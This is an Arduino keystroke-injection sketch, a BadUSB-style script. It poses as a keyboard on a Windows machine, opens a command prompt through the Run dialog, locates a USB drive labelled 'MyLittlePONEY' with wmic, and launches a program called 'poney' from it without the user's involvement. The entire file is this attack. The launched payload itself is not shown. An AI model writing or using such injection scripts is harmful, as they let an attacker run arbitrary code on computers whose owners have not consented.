#include <Keyboard.h>

void setup() {

	Keyboard.begin();
	delay(1000);

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.print("r");
	Keyboard.releaseAll();
	delay(200);

	Keyboard.print("cmd");
	delay(20);

	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(200);
	
	/*
	for /f %%D in ('wmic volume get DriveLetter^, Label ^| find "yourLabel"') do set usb=%%D
	*/

	Keyboard.print("for /f %D in ('wmic volume get DriveLetter^, Label ^");
	//Keyboard.print("|");
	Keyboard.press(KEY_RIGHT_ALT);
	Keyboard.print("-");
	Keyboard.releaseAll();
	Keyboard.print("find \"MyLittlePONEY\"') do set PONEY=%D");
	delay(200);
	
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(200);

	Keyboard.print("%PONEY%");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(50);

	Keyboard.print("poney");
	Keyboard.press(KEY_RETURN);
	Keyboard.releaseAll();
	delay(50);

	Keyboard.end();

}


void loop() {
}
